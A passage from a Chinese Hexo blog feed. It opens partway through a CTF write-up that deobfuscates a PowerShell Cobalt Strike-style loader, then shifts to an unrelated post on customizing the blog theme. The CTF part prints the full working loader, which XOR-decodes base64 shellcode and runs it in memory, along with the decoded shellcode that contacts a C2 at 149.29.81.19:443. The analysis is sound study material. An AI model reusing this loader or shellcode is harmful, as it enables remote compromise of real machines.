class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Set-StrictMode</span> <span class="hljs-literal">-Version</span> <span class="hljs-number">2</span><br><br><span class="hljs-variable">$DoIt</span> = <span class="hljs-string">@&#x27;</span><br><span class="hljs-string">function func_get_proc_address &#123;</span><br><span class="hljs-string">        Param ($var_module, $var_procedure)</span><br><span class="hljs-string">        $var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object &#123; $_.GlobalAssemblyCache -And $_.Location.Split(&#x27;\\&#x27;)[-1].Equals(&#x27;System.dll&#x27;) &#125;).GetType(&#x27;Microsoft.Win32.UnsafeNativeMethods&#x27;)</span><br><span class="hljs-string">        $var_gpa = $var_unsafe_native_methods.GetMethod(&#x27;GetProcAddress&#x27;, [Type[]] @(&#x27;System.Runtime.InteropServices.HandleRef&#x27;, &#x27;string&#x27;))</span><br><span class="hljs-string">        return $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var_unsafe_native_methods.GetMethod(&#x27;GetModuleHandle&#x27;)).Invoke($null, @($var_module)))), $var_procedure))</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">function func_get_delegate_type &#123;</span><br><span class="hljs-string">        Param (</span><br><span class="hljs-string">                [Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_parameters,</span><br><span class="hljs-string">                [Parameter(Position = 1)] [Type] $var_return_type = [Void]</span><br><span class="hljs-string">        )</span><br><span class="hljs-string"></span><br><span class="hljs-string">        $var_type_builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName(&#x27;ReflectedDelegate&#x27;)), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule(&#x27;InMemoryModule&#x27;, $false).DefineType(&#x27;MyDelegateType&#x27;, &#x27;Class, Public, Sealed, AnsiClass, AutoClass&#x27;, [System.MulticastDelegate])</span><br><span class="hljs-string">        $var_type_builder.DefineConstructor(&#x27;RTSpecialName, HideBySig, Public&#x27;, [System.Reflection.CallingConventions]::Standard, $var_parameters).SetImplementationFlags(&#x27;Runtime, Managed&#x27;)</span><br><span class="hljs-string">        $var_type_builder.DefineMethod(&#x27;Invoke&#x27;, &#x27;Public, HideBySig, NewSlot, Virtual&#x27;, $var_return_type, $var_parameters).SetImplementationFlags(&#x27;Runtime, Managed&#x27;)</span><br><span class="hljs-string"></span><br><span class="hljs-string">        return $var_type_builder.CreateType()</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">[Byte[]]$var_code = [System.Convert]::FromBase64String(&#x27;38uqIyMjQ6rGEvFHqHETqHEvqHE3qFELLJRpBRLcEuOPH0JfIQ8D4uwuIuTB03F0qHEzqGEfIvOoY1um41dpIvNzqGs7qHsDIvDAH2qoF6gi9RLcEuOP4uwuIuQbw1bXIF7bGF4HVsF7qHsHIvBFqC9oqHs/IvCoJ6gi86pnBwd4eEJ6eXLcw3t8eagxyKV+S01GVyNLVEpNSndLb1QFJNz2yyMjIyMS3HR0dHR0Sxl1WoTc9sqHIyMjeBLqcnJJIHJyS5giIyNwc0t0qrzl3PZzyq8jIyN4EvFxSyMR46dxcXFwcXNLyHYNGNz2quWg4HNLoxAjI6rDSSdzSTx1S1ZlvaXc9nwS3HR0SdxwdUsOJTtY3Pam4yyn6SIjIxLcptVXJ6rayCpLiebBftz2quJLZgJ9Etz2Etx0SSRydXNLlHTDKNz2nCMMIyMa5FYke3PKWNzc3BLcyrIiIyPK6iIjI8tM3NzcDGZ5dEUjSEwodIgEoJKXg6X5qzPHl1iO1buG+VuC6rtpnoH41qg2+GNzdpA2TdUXolH+tJ/mUO65byu/dx/NX5qstEl/1PmpWeplO0fErSN2UEZRDmJERk1XGQNuTFlKT09CDBYNEwMLQExOU0JXSkFPRhgDbnBqZgMaDRMYA3RKTUdMVFADbXcDFQ0SGAN3UUpHRk1XDBYNExgDYWxqZhoYc3dhcQouKSP4VpuFSK7RM6YYoEWg5NP6S9kDRy7v1+9l6XvafZkG84FqmRudQNMHNVeEM9WPDUrPGzBH2tZZpMkasn6vGEqpNpUUjihiQnkd4eovJ5UwNNWBtXdWBhJ7ISLKZq6AwYNoC+D0hbjBx8myxeQl7sj9hecL1KkJuU2mb+lDhPXgV+QPHbyNyxgW2LAdGXKMGjAwRDJfHspTfpmzbTfjpGaZreF0vnnOmPUrC+QoYqNMVtUlkoRz/PZlPTWZ+1fLS6OregYTdGzqEFvmcEtE2vxec7qhtWIjS9OWgXXc9kljSyMzIyNLIyNjI3RLe4dwxtz2sJojIyMjIvpycKrEdEsjAyMjcHVLMbWqwdz2puNX5agkIuCm41bGe+DLqt7c3BIXGg0RGw0bEg0SGiMjIyMg&#x27;)</span><br><span class="hljs-string"></span><br><span class="hljs-string">for ($x = 0; $x -lt $var_code.Count; $x++) &#123;</span><br><span class="hljs-string">        $var_code[$x] = $var_code[$x] -bxor 35</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">$var_va = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll VirtualAlloc), (func_get_delegate_type @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))</span><br><span class="hljs-string">$var_buffer = $var_va.Invoke([IntPtr]::Zero, $var_code.Length, 0x3000, 0x40)</span><br><span class="hljs-string">[System.Runtime.InteropServices.Marshal]::Copy($var_code, 0, $var_buffer, $var_code.length)</span><br><span class="hljs-string"></span><br><span class="hljs-string">$var_runme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_buffer, (func_get_delegate_type @([IntPtr]) ([Void])))</span><br><span class="hljs-string">$var_runme.Invoke([IntPtr]::Zero)</span><br><span class="hljs-string">&#x27;@</span><br><br><span class="hljs-keyword">If</span> ([<span class="hljs-built_in">Int</span><span class="hljs-type">Ptr</span>]::size <span class="hljs-operator">-eq</span> <span class="hljs-number">8</span>) &#123;<br>        <span class="hljs-built_in">start-job</span> &#123; <span class="hljs-keyword">param</span>(<span class="hljs-variable">$a</span>) <span class="hljs-built_in">IEX</span> <span class="hljs-variable">$a</span> &#125; <span class="hljs-literal">-RunAs32</span> <span class="hljs-literal">-Argument</span> <span class="hljs-variable">$DoIt</span> | <span class="hljs-built_in">wait-job</span> | <span class="hljs-built_in">Receive-Job</span><br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">IEX</span> <span class="hljs-variable">$DoIt</span><br>&#125;<br><br></code></pre></td></tr></table></figure><p>可以看到中间又有一个base64的密文：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs base64">38uqIyMjQ6rGEvFHqHETqHEvqHE3qFELLJRpBRLcEuOPH0JfIQ8D4uwuIuTB03F0qHEzqGEfIvOoY1um41dpIvNzqGs7qHsDIvDAH2qoF6gi9RLcEuOP4uwuIuQbw1bXIF7bGF4HVsF7qHsHIvBFqC9oqHs/IvCoJ6gi86pnBwd4eEJ6eXLcw3t8eagxyKV+S01GVyNLVEpNSndLb1QFJNz2yyMjIyMS3HR0dHR0Sxl1WoTc9sqHIyMjeBLqcnJJIHJyS5giIyNwc0t0qrzl3PZzyq8jIyN4EvFxSyMR46dxcXFwcXNLyHYNGNz2quWg4HNLoxAjI6rDSSdzSTx1S1ZlvaXc9nwS3HR0SdxwdUsOJTtY3Pam4yyn6SIjIxLcptVXJ6rayCpLiebBftz2quJLZgJ9Etz2Etx0SSRydXNLlHTDKNz2nCMMIyMa5FYke3PKWNzc3BLcyrIiIyPK6iIjI8tM3NzcDGZ5dEUjSEwodIgEoJKXg6X5qzPHl1iO1buG+VuC6rtpnoH41qg2+GNzdpA2TdUXolH+tJ/mUO65byu/dx/NX5qstEl/1PmpWeplO0fErSN2UEZRDmJERk1XGQNuTFlKT09CDBYNEwMLQExOU0JXSkFPRhgDbnBqZgMaDRMYA3RKTUdMVFADbXcDFQ0SGAN3UUpHRk1XDBYNExgDYWxqZhoYc3dhcQouKSP4VpuFSK7RM6YYoEWg5NP6S9kDRy7v1+9l6XvafZkG84FqmRudQNMHNVeEM9WPDUrPGzBH2tZZpMkasn6vGEqpNpUUjihiQnkd4eovJ5UwNNWBtXdWBhJ7ISLKZq6AwYNoC+D0hbjBx8myxeQl7sj9hecL1KkJuU2mb+lDhPXgV+QPHbyNyxgW2LAdGXKMGjAwRDJfHspTfpmzbTfjpGaZreF0vnnOmPUrC+QoYqNMVtUlkoRz/PZlPTWZ+1fLS6OregYTdGzqEFvmcEtE2vxec7qhtWIjS9OWgXXc9kljSyMzIyNLIyNjI3RLe4dwxtz2sJojIyMjIvpycKrEdEsjAyMjcHVLMbWqwdz2puNX5agkIuCm41bGe+DLqt7c3BIXGg0RGw0bEg0SGiMjIyMg<br></code></pre></td></tr></table></figure><h3 id="第三次解密">第三次解密</h3><p>再次解密后发现又是一个乱码，说明又有什么加密处理方式我们没注意到：</p><p><img src="/2021/05/06/%E4%B8%80%E9%81%93Powershell%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E7%9A%84CTF%E9%A2%98/image-20210506114917030.png" alt="三次解密"></p><p>看明文可知，在下面的代码里进行了按位异或运算：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-keyword">for</span> (<span class="hljs-variable">$x</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$x</span> <span class="hljs-operator">-lt</span> <span class="hljs-variable">$var_code</span>.Count; <span class="hljs-variable">$x</span>++) &#123;<br>        <span class="hljs-variable">$var_code</span>[<span class="hljs-variable">$x</span>] = <span class="hljs-variable">$var_code</span>[<span class="hljs-variable">$x</span>] <span class="hljs-operator">-bxor</span> <span class="hljs-number">35</span><br>&#125;<br></code></pre></td></tr></table></figure><p>打开powershell，原封不动的从明文拷贝以下指令：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\Users\Key&gt; [<span class="hljs-built_in">Byte</span>[]]<span class="hljs-variable">$var_code</span> = [<span class="hljs-type">System.Convert</span>]::FromBase64String(<span class="hljs-string">&#x27;38uqIyMjQ6rGEvFHqHETqHEvqHE3qFELLJRpBRLcEuOPH0JfIQ8D4uwuIuTB03F0qHEzqGEfIvOoY1um41dpIvNzqGs7qHsDIvDAH2qoF6gi9RLcEuOP4uwuIuQbw1bXIF7bGF4HVsF7qHsHIvBFqC9oqHs/IvCoJ6gi86pnBwd4eEJ6eXLcw3t8eagxyKV+S01GVyNLVEpNSndLb1QFJNz2yyMjIyMS3HR0dHR0Sxl1WoTc9sqHIyMjeBLqcnJJIHJyS5giIyNwc0t0qrzl3PZzyq8jIyN4EvFxSyMR46dxcXFwcXNLyHYNGNz2quWg4HNLoxAjI6rDSSdzSTx1S1ZlvaXc9nwS3HR0SdxwdUsOJTtY3Pam4yyn6SIjIxLcptVXJ6rayCpLiebBftz2quJLZgJ9Etz2Etx0SSRydXNLlHTDKNz2nCMMIyMa5FYke3PKWNzc3BLcyrIiIyPK6iIjI8tM3NzcDGZ5dEUjSEwodIgEoJKXg6X5qzPHl1iO1buG+VuC6rtpnoH41qg2+GNzdpA2TdUXolH+tJ/mUO65byu/dx/NX5qstEl/1PmpWeplO0fErSN2UEZRDmJERk1XGQNuTFlKT09CDBYNEwMLQExOU0JXSkFPRhgDbnBqZgMaDRMYA3RKTUdMVFADbXcDFQ0SGAN3UUpHRk1XDBYNExgDYWxqZhoYc3dhcQouKSP4VpuFSK7RM6YYoEWg5NP6S9kDRy7v1+9l6XvafZkG84FqmRudQNMHNVeEM9WPDUrPGzBH2tZZpMkasn6vGEqpNpUUjihiQnkd4eovJ5UwNNWBtXdWBhJ7ISLKZq6AwYNoC+D0hbjBx8myxeQl7sj9hecL1KkJuU2mb+lDhPXgV+QPHbyNyxgW2LAdGXKMGjAwRDJfHspTfpmzbTfjpGaZreF0vnnOmPUrC+QoYqNMVtUlkoRz/PZlPTWZ+1fLS6OregYTdGzqEFvmcEtE2vxec7qhtWIjS9OWgXXc9kljSyMzIyNLIyNjI3RLe4dwxtz2sJojIyMjIvpycKrEdEsjAyMjcHVLMbWqwdz2puNX5agkIuCm41bGe+DLqt7c3BIXGg0RGw0bEg0SGiMjIyMg&#x27;</span>)<br><span class="hljs-built_in">PS</span> C:\Users\Key&gt; <span class="hljs-keyword">for</span> (<span class="hljs-variable">$x</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$x</span> <span class="hljs-operator">-lt</span> <span class="hljs-variable">$var_code</span>.Count; <span class="hljs-variable">$x</span>++) &#123;<br>&gt;&gt;         <span class="hljs-variable">$var_code</span>[<span class="hljs-variable">$x</span>] = <span class="hljs-variable">$var_code</span>[<span class="hljs-variable">$x</span>] <span class="hljs-operator">-bxor</span> <span class="hljs-number">35</span><br>&gt;&gt; &#125;<br><span class="hljs-built_in">PS</span> C:\Users\Key&gt;<br></code></pre></td></tr></table></figure><p>此时，再对异或运算之后<code>$var_code</code>这一变量进行base64逆运算，此时会报错：</p><p><img src="/2021/05/06/%E4%B8%80%E9%81%93Powershell%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E7%9A%84CTF%E9%A2%98/image-20210506152241767.png" alt="报错"></p><p>不过无所谓，把出错的base64值，也就是下面的值用linux里的base64再次解密即可：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs base64">/OiJAAAAYInlMdJki1Iwi1IMi1IUi3IoD7dKJjH/McCsPGF8Aiwgwc8NAcfi8FJXi1IQi0I8AdCLQHiFwHRKAdBQi0gYi1ggAdPjPEmLNIsB1<br>jH/McCswc8NAcc44HX0A334O30kdeJYi1gkAdNmiwxLi1gcAdOLBIsB0IlEJCRbW2FZWlH/4FhfWosS64ZdaG5ldABod2luaVRoTHcmB//V6AAAAAAx/1dX<br>V1dXaDpWeaf/1emkAAAAWzHJUVFqA1FRaLsBAABTUGhXiZ/G/9VQ6YwAAABbMdJSaAAywIRSUlJTUlBo61UuO//VicaDw1BogDMAAIngagRQah9WaHVGnob<br>/1V8x/1dXav9TVmgtBhh7/9WFwA+EygEAADH/hfZ0BIn56wloqsXiXf/VicFoRSFeMf/VMf9XagdRVlBot1fgC//VvwAvAAA5x3UHWFDpe////zH/6ZEBAA<br>DpyQEAAOhv////L0VaV2YAa28LV6sng7G0oIbaiBDktHut9pil2nihyZhKvaLb9YsV20BQVbMVbvY0gXLdl7zFc82aTAicVDzufLmPl2pc99qKeslGGGTnj<br>gBVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoY29tcGF0aWJsZTsgTVNJRSA5LjA7IFdpbmRvd3MgTlQgNi4xOyBUcmlkZW50LzUuMDsgQk9JRTk7UFRCUikN<br>CgDbdbima43yEIU7g2aDx/DZaPogZA3M9MxGylj5Xrol0KJJuji+Y/AkFnSnEPasLmnsOBNk+fV6h+o5kV2MO2mKFbY3rQtBYVo+wskMBLYTF/aillR1JTF<br>YAgHpRY2j4qBLKMPXppvi5OqR5scGzevepsQo94oqmm6FTMpgp9bDdMcsPp+u6Ds1+5M+OlGvORMTZxF8PelwXbqQThTAh0W6jsJXnVrtu9YIKMcLQYBvdf<br>YGsadQ39VGHha62HToaICIWSUwV0/JM3jFU2hn+d99UJmClkEAaPC1olb/1WpAaAAQAABoAABAAFdoWKRT5f/Vk7kAAAAAAdlRU4nnV2gAIAAAU1ZoEpaJ4<br>v/VhcB0xosHAcOFwHXlWMPoif3//zE0OS4yOC44MS4xOQAAAAAD<br></code></pre></td></tr></table></figure><p>结果图如下，可知道IP地址为149.29.81.19。</p><p><img src="/2021/05/06/%E4%B8%80%E9%81%93Powershell%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E7%9A%84CTF%E9%A2%98/image-20210506152421262.png" alt="最终解密结果"></p><div class="note note-info">            <p>参考：<a href="https://www.youtube.com/watch?v=RX2o7GTVG6Q">https://www.youtube.com/watch?v=RX2o7GTVG6Q</a></p><p>这个是苑老师的解法，需要密钥，但是不清楚密钥从原文哪里可以看出。另外也不知道端口号怎么解出。</p><p>猜测是进行端口扫描可以知道，答案是149.29.81.19:443。</p>          </div><h2 id="0x03-参考">0x03 参考</h2><p><a href="https://www.youtube.com/watch?v=RX2o7GTVG6Q">https://www.youtube.com/watch?v=RX2o7GTVG6Q</a></p><p><a href="https://blog.csdn.net/qq_45503700/article/details/100678500">https://blog.csdn.net/qq_45503700/article/details/100678500</a></p><p><a href="https://github.com/aleenzz/Cobalt_Strike_wiki/blob/master/2.%E7%AC%AC%E5%85%AD%E8%8A%82%5Bpowershell%E6%B7%B7%E6%B7%86%5D.md">https://github.com/aleenzz/Cobalt_Strike_wiki/blob/master/2.第六节[powershell混淆].md</a></p><p><a href="https://www.thinbug.com/q/48620882">https://www.thinbug.com/q/48620882</a></p><p><a href="https://blog.csdn.net/qq_45503700/article/details/100678500">https://blog.csdn.net/qq_45503700/article/details/100678500</a></p>]]></content>
    
    
    <categories>
      
      <category>学习</category>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>学习</tag>
      
      <tag>CTF</tag>
      
      <tag>Powershell</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>博客新主题的折腾过程</title>
    <link href="/2021/05/05/%E5%8D%9A%E5%AE%A2%E6%96%B0%E4%B8%BB%E9%A2%98%E7%9A%84%E6%8A%98%E8%85%BE%E8%BF%87%E7%A8%8B/"/>
    <url>/2021/05/05/%E5%8D%9A%E5%AE%A2%E6%96%B0%E4%B8%BB%E9%A2%98%E7%9A%84%E6%8A%98%E8%85%BE%E8%BF%87%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言">0x00 前言</h2><p>博客从<em>next</em>主题换到了<em>fluid</em>主题，感觉还可以，然后自己又折腾把一些东西重新配置了一下。</p><p>P.S：另外网站里存在一个字符画彩蛋~</p><h2 id="0x01-看板娘">0x01 看板娘</h2><p>原来的看板娘插件是hexo-helper-live2d，github地址已经停止更新。</p><p>现在就移除旧的插件，安装较新的live2d-widget。</p><p>项目地址：<a href="https://github.com/stevenjoezhang/live2d-widget">https://github.com/stevenjoezhang/live2d-widget</a></p><p>下面是我的操作步骤：</p><ol><li><p>首先卸载掉原来的helper-live2d，在cmd里输入 <code>npm uninstall hexo-helper-live2d@xx</code>，其中xx指代的是你的旧插件版本，不知道版本号的可以利用<code>npm list</code>查看。</p></li><li><p>把live2d-widget项目git clone到本地，将文件夹复制到hexo/source/目录下。</p><p><img src="/2021/05/05/%E5%8D%9A%E5%AE%A2%E6%96%B0%E4%B8%BB%E9%A2%98%E7%9A%84%E6%8A%98%E8%85%BE%E8%BF%87%E7%A8%8B/image-20210505151549849.png" alt="差不多是这个样子"></p></li><li><p>打开项目目录的<em>autoload.js</em>，在开头的<code>const live2d_path = &quot;/live2d-widget/&quot;</code>路径更换成绝对路径。</p><p><a href="http://xn--gitpageadmin-5j8sh98f4ga555api0d2hvln0c.github.io">比如你的gitpage地址是admin.github.io</a>，live2d文件夹是live2d-widget，则路径填写为<code>admin.github.io/live2d-widget/</code>，不要忘了最后的斜杠。</p></li><li><p>因为hexo在编译的时候，可能会对插件渲染造成一定的影响，所以在根目录的config.yml里找到<em>skip_render</em>项，把live2d的目录添加上，以跳过渲染：</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs yml"><span class="hljs-attr">skip_render:</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">&#x27;live2d-widget/**&#x27;</span><br></code></pre></td></tr></table></figure></li><li><p>然后就是在自定义head节点内容里添加autoload.js，如下图所示。</p><p>因为我这里用了fluid主题，所以在fluid主题的配置文件_config.fluid.yml里可以找到添加的选项，其他主题请自行寻找。</p><p><img src="/2021/05/05/%E5%8D%9A%E5%AE%A2%E6%96%B0%E4%B8%BB%E9%A2%98%E7%9A%84%E6%8A%98%E8%85%BE%E8%BF%87%E7%A8%8B/image-20210505152121075.png" alt="依旧是绝对路径"></p></li><li><p>之后<code>hexo g</code>与<code>hexo d</code>重新部署下环境，应该可以搭建完成。</p><p>有的时候会报下面几个错误，可能是第4步没有配置好：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title class_">Uncaught</span> <span class="hljs-title class_">SyntaxError</span>: <span class="hljs-title class_">Unexpected</span> token <span class="hljs-keyword">return</span><br><span class="hljs-title class_">Uncaught</span> <span class="hljs-title class_">SyntaxError</span>: <span class="hljs-title class_">Unexpected</span> token <span class="hljs-variable language_">this</span><br><span class="hljs-title class_">Uncaught</span> <span class="hljs-title class_">ReferenceError</span>: initWidget is not defined<br></code></pre></td></tr></table></figure><p>还有可能是*<a href="https://clannad.io/live2d/waifu-tips.js">waifu-tips.js</a>*这个文件换行符是CRLF，手动改成LF再重试。</p></li></ol><h2 id="0x02-写日志">0x02 写日志</h2><p>在hexo博客折腾过程中，发现利用<code>hexo new</code>生成的markdown格式不是很全，比如分类、文章头图和加密都没有，查阅资料可以知道，通过编辑文件<code>hexo/scaffolds/post.md</code>来进行深度自定义化。</p><h2 id="0x03-字体">0x03 字体</h2><div class="note note-info">            <p>此处参考：<a href="https://erenship.com/posts/40222.html">https://erenship.com/posts/40222.html</a></p>          </div><p>2018 年在 Google Fonts 上已经托管了思源宋体，所以我们可以直接通过托管引入到我们的博客中。</p><p>打开 <a href="https://fonts.google.com/">Google Fonts</a>，搜索思源宋体的英文名：<code>Noto Serif SC</code>，在列表中选择我们个人觉得合适的字体样式，点击右侧的 <code>Select this style</code>，注意此处可根据自己需要选择多个样式。</p><ol><li><p>在按照上述教程将 代码复制好之后，打开 <code>\themes\fluid\layout\_partial</code> 目录下的 <code>head.ejs</code> 文件，将引入链接添加进文档中。</p><p><a href="https://cdn.jsdelivr.net/gh/erenlu/PicGo//img/20200905103fff918.png"><img src="https://cdn.jsdelivr.net/gh/erenlu/PicGo//img/20200905103fff918.png" alt></a></p><p><a href="https://cdn.jsdelivr.net/gh/erenlu/PicGo//img/2020090510kk4055.png"><img src="https://cdn.jsdelivr.net/gh/erenlu/PicGo//img/2020090510kk4055.png" alt></a></p></li><li><p>将字体英文名称添加到 <code>\themes\fluid\source\css\variables\</code> 目录下的 <code>base.styl</code> 文件中，具体位置为 <code>font-family:</code> 。例如笔者引入的字体位思源宋体，其英文名称为 “Noto Serif SC”。</p><p><a href="https://cdn.jsdelivr.net/gh/erenlu/PicGo/img/20200826200147.png"><img src="https://cdn.jsdelivr.net/gh/erenlu/PicGo/img/20200826200147.png" alt></a></p></li></ol><p>至此，我们就完成了自定义字体引入。你可以执行部署命令来检查是否成功引入。</p><h2 id="0x04-便签">0x04 便签</h2><h3 id="Tag-插件">Tag 插件</h3><h4 id="便签">便签</h4><p>在 markdown 中加入如下的代码来使用便签：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs markdown">&#123;% note success %&#125;<br>文字 或者 <span class="hljs-code">`markdown`</span> 均可<br>&#123;% endnote %&#125;<br></code></pre></td></tr></table></figure><p>或者使用 HTML 形式：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;note note-primary&quot;</span>&gt;</span>标签<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br></code></pre></td></tr></table></figure><p>可选便签：</p><p>primary、secondary、success、danger、warning、info、light、WARNING</p><div class="note note-primary">            <p>primary</p>          </div><div class="note note-secondary">            <p>secondary</p>          </div><div class="note note-success">            <p>success</p>          </div><div class="note note-danger">            <p>danger</p>          </div><div class="note note-warning">            <p>warning</p>          </div><div class="note note-info">            <p>info</p>          </div><div class="note note-warning">            <p>warning</p>          </div><div class="note note-light">            <p>light</p>          </div><p>使用时 <code>&#123;% note primary %&#125;` 和 `&#123;% endnote %&#125;</code> 需单独一行，否则会出现问题</p><h4 id="行内标签">行内标签</h4><p>在 markdown 中加入如下的代码来使用 Label：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">&#123;% label primary @text %&#125;<br></code></pre></td></tr></table></figure><p>或者使用 HTML 形式：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;label label-primary&quot;</span>&gt;</span>Label<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="勾选框">勾选框</h4><p>在 markdown 中加入如下的代码来使用 Checkbox：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">&#123;% cb text, checked?, incline? %&#125;<br></code></pre></td></tr></table></figure><p>text：显示的文字<br>checked：默认是否已勾选，默认 false<br>incline: 是否内联（可以理解为后面的文字是否换行），默认 false</p><p>示例：</p><div>            <input type="checkbox" disabled>普通示例          </div><div>            <input type="checkbox" disabled checked="checked">默认选中          </div>            <input type="checkbox" disabled>内联示例           后面文字不换行<input type="checkbox" disabled> 也可以只传入一个参数，文字写在后边（这样不支持外联）<h4 id="按钮">按钮</h4><p>你可以在 markdown 中加入如下的代码来使用 Button：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">&#123;% btn url, text, title %&#125;<br></code></pre></td></tr></table></figure><p>或者使用 HTML 形式：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;url&quot;</span> <span class="hljs-attr">title</span>=<span class="hljs-string">&quot;title&quot;</span>&gt;</span>text<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure><p>url：跳转链接<br>text：显示的文字<br>title：鼠标悬停时显示的文字（可选）</p><a class="btn" href="https://www.baidu.com" title="你就知道" target="_blank">百度一下</a><h2 id="0x05-鼠标指针">0x05 鼠标指针</h2><div class="note note-info">            <p>参考：<a href="https://520526.xyz/1099/">https://520526.xyz/1099/</a></p>          </div><p>因为我的fluid是通过npm安装的，所以主题文件都在node_modules的hexo-theme-fluid文件夹里。</p><p>自定义鼠标指针很简单，只需要在<code>source/css/</code>路径新建一个鼠标css样式，再从fluid的yml配置文件里引用custom_css即可。</p><div class="note note-light">            <p>2021-6-4不知道为什么日常上传的时候会丢掉css文件，姑且在这里做个记录</p>          </div><p><strong>/source/css/cur.css</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">body</span>&#123;<br>    <span class="hljs-attribute">cursor</span>: <span class="hljs-built_in">url</span>(<span class="hljs-string">&quot;/img/cur1.png&quot;</span>), default <span class="hljs-meta">!important</span>;<br>&#125;<br><span class="hljs-selector-tag">div</span> &#123;<br>    <span 